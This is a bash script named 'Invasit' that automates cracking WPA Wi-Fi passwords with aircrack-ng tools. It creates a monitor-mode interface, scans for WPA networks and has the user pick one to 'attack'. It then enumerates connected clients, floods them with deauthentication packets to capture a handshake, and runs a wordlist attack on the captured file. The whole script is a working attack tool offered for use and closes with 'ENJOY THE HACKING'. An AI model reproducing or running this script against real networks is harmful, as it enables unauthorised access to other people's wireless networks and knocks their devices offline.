#!/bin/bash

# Invasit version 1 || by: valvesss

###################### SHORTCUTS #############################

airodump1='xterm -title $name -e airodump-ng --encrypt WPA $nic -w $name -o csv'
airodump2='xterm -title $name -e airodump-ng --bssid $bssidtarget -c $channel,$channel -w $name -o csv $nic'
airodump3='xterm -title $name -e airodump-ng -d $bssidtarget -c $channel,$channel -w $name -o cap $nic &'
aireplay1='xterm -title $name -e aireplay-ng -0 15 -a $bssidtarget -c $bssidclient $nic --ignore-negative-one'
si='0.5'
######################### START #############################
# Precautions
trap ctrl_c INT
function ctrl_c(){
	END
}
# Main
MAIN(){
	MONMODE
}

# 1) Create NIC mon0
MONMODE(){
nic=mon0
iwconfig > nic.txt
nicreal=$(cat nic.txt | awk 'NR==1{print $1}')
rm -rf nic.txt
if iwconfig | grep -q $nic ; then
	INTRO
else
	clear
	iw dev $nicreal interface add $nic type monitor &> /dev/null
	INTRO
fi
}

INTRO(){
clear
echo ""
echo "	I  NN       N  V             V  A         SSSSSSSS  I  TTTTTTTTT"
sleep $si
echo "	I  N N      N   V           V  A A        S         I      T"
sleep $si
echo "	I  N  N     N    V         V  A   A       S         I      T"
sleep $si
echo "	I  N   N    N     V       V  A     A      SSSSSSSS  I      T"
sleep $si
echo "	I  N    N   N      V     V  AAAAAAAAA            S  I      T"
sleep $si
echo "	I  N     N  N       V   V  A         A           S  I      T"
sleep $si
echo "	I  N      N N        V V  A           A          S  I      T"
sleep $si
echo "	I  N       NN         V  A             A  SSSSSSSS  I      T"
sleep $si
echo ""
echo "	v1 / by: valvesss / support: sleepyhollow.lockwood@protonmail.ch"
SOLARQ
}

# 2) Ask for the name of all files the will be generated
SOLARQ(){
echo ""
echo 'Note: this terminal will only be released after the key is found.'
echo ""
echo "########################################################"
echo "# 1) Set the name of the files that will be generated: #"
echo "########################################################"
read name
WORDLIST
}

# 3) Search wordlist and verify if don't exist
WORDLIST(){
echo ""
echo "###################################"
echo "# 2) Type the wordlist full path: #"
echo "###################################"
echo -n "You are at: "
pwd
read path
a=0
while [ $a -eq 0  ]
do
	if [ !  -f $path ]; then
		echo ""
		echo "##################################"
		echo "# Wordlist not found, try again: #"
		echo "##################################"
		read path
	else
		a=1
	fi
done
GERTAB
}

# 4) Generate table with all WPA networks found
GERTAB(){
echo ""
echo "#######################################################"
echo "# 3) When you find the target network, press CTRL+C.  #"
echo "#######################################################"
eval $airodump1
echo ""
echo "#################"
echo "# Rescan? [y/n] #"
echo "#################"
read rescan
if [ $rescan = "y" ] || [ $rescan = "Y" ]; then
	rm -rf $name-01.csv
	eval $airodump1
fi
COMDAD
}

# 5) Edit airodump output in a human readable way
COMDAD(){
if [ ! -f $name-01.csv ]; then
	echo ""
	echo "################################"
	echo "# .csv not found, reescaning... #"
	echo "################################"	
	$airodump1
fi
echo ""
echo "#############################################"
echo "# 4) Select the network you want to attack: #"
echo "#############################################"
echo ""
cat $name-01.csv | cut -d ',' -f 1,4,14,9 | sed '/Station MAC/,$d' | sed '/^\s*$/d' | sed 's/,//g' | tail -n +2 | nl | awk '{print $1,$5,$2,$3,$4}' | column -t | sed '/ESSID/G' > $name.txt
echo "-------------------------------------------"
cat $name.txt
echo "^------------------------------------------"
read num
bssidtarget=$(cat $name.txt | awk -v aux=$num 'NR==aux {print $3}')
channel=$(cat $name.txt | awk -v aux=$num 'NR==aux {print $4}')
networkname=$(cat $name.txt | awk -v aux=$num 'NR==aux {print $2}')
rm -rf $name.txt
GERDAD
}

# 6) Gera dados para capturar o BSSID dos clientes
GERDAD(){
echo ""
echo "###########################################################################"
echo "# 5) Wait to list 2 or more client above STATION column and press CTRL+C. #"
echo "###########################################################################"
eval $airodump2
aux=1
	while [ $aux = 1 ]; do

		echo ""
		echo "##########################################"
		echo "# Try again? [0/1] / Change Network? [c] #"
		echo "##########################################"
		read aux
			if [ $aux = 1 ]; then
				rm -rf $name-01.csv
			elif [ $aux = "c" ] || [ $aux = "C" ]; then
				rm -rf $name-02.csv
				eval $airodump1
					COMDAD
			elif [ $aux != 1 ] && [ $aux != 0 ]; then
				echo "Invalid option, try again."
				aux=1
			fi
	done
mac=$name.lst
cat $name-02.csv | awk 'NR==6,NR==10' | awk '{print $1}' | sed 's/,//g' | sed '/^\s*$/d' > $mac
rm -rf $name-02.csv
SCAN
}

# 7) Scan the specific network
SCAN(){
echo ""
echo "#######################################"
echo "# Scanning for $networkname HANDSHAKE #"
echo "#######################################"
eval $airodump3
HANDSHAKE
}

# 8) Start the handshake capture
HANDSHAKE(){
rm -rf $name-01.csv
nr=$(cat $mac | wc -l)
i=1
while [ $i -le $nr ]; do
	bssidclient=$(awk -v var=$i 'NR==var' $mac)
	eval $aireplay1
	let i=i+1
done
AIRCRACK
}

# 9) Decryptograph the password
AIRCRACK(){
sleep 5
a=0
while [ $a -eq 0  ]
do
		if [ ! -f $name-01.cap ]; then
			b=0
			while [ $b -le 3 ]
			do
				echo ""
				echo "###############################"
				echo "# .cap not found, reescaning. #"
				echo "###############################"
				sleep 5
				SCAN
				let b=b+1
			done
		fi
	if aircrack-ng $name-01.cap | egrep '0 handshake|0 packets|No networks' &> /dev/null; then
		echo ""
		echo "#############################################################################"
		echo "# Handshake packet not found in .cap file, try again? [y/n] / Continue [c] #"
		echo "############################################################################"
		read wish
		if [ $wish = "y" ] || [ $wish = "Y" ]; then
			HANDSHAKE
		elif [ $wish = "n" ] || [ $wish = "N" ]; then
			END
			exit;
		elif [ $aux = "c" ] || [ $aux = "C" ]; then
			a=1
		fi
	fi
	a=1
done
rm -rf $mac
kill $(ps aux | grep 'xterm' | awk '{print $2}') &> /dev/null
wpaclean $name-clean.cap $name-01.cap &> /dev/null
aircrack-ng $name-clean.cap -w $path &
END
}

# 10) Reinicialize network services and delete the nic created
END(){
iwconfig | grep Monitor > monitor.txt &> /dev/null
sleep 0.01
clear
echo "[+] Deleting network card if created..."
	if cat monitor.txt | awk '{print $1}' &> /dev/null ; then
		iw dev $nic del &> /dev/null
	fi
rm -rf monitor.txt &> /dev/null
sleep 0.01
echo "[+] Deleting jerk files..."
rm -rf $name-01.csv &> /dev/null
rm -rf $name-01.cap &> /dev/null
sleep 1
echo "[+] Restarting network services..."
service NetworkManager restart
service networking restart
sleep 1
echo "[+] Thanks for using!"
sleep 1
echo ""
echo '############################################################'
echo '##	ENJOY THE HACKING, I N V A S I T EVERYWHERE	  ##'
echo '############################################################'
exit
}
MAIN
